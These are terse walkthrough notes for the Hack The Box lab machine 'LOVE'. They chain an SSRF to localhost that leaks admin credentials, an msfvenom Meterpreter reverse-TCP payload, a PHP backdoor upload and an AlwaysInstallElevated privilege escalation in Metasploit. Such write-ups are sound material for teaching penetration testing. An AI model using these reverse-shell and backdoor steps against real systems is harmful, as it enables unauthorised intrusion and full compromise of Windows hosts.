MACHINE IP: 10.10.10.239
MACHINE NAME: LOVE

#nmap scan as ussual.

Open ports:

Port 135: msrpc
Port 139: netbios
Port 443: HTTPS (commonName=staging.love.htb)
Port 80: HTTP (http-title: Voting System using PHP)
Port 5000: Apache httpd.

Navigating to: staging.love.htb/. Ensure this is included in the /etc/hosts file.
This lands us on this page:


Interact some more with this page.
There's an interesting functionality on the demo tab.
Specify the file url: http://127.0.0.1:5000

Score!: Vote Admin Creds admin: @LoveIsInTheAir!!!! 

Navigate to 10.10.10.239/admin and login using the above creds.

#Craft a payload.

msfvenom -p windows/meterpreter/rverse_tcp lport=2525 lhost=tun0 -f exe -o photo.exe


PHP Backdoor: Simple php backdoor by DK, upload through the update status functionality.

Jump on to msfconsole.

search multi/handler

Set lport same as on the php backdoor script.

set payload windows/meterpreter/reverse_tcp.



For root, we use the always_install_elevated in meterpreter

Background the session.

search always_install

set session 1

set lport same as on the php backdoor script.

set lhost tun0




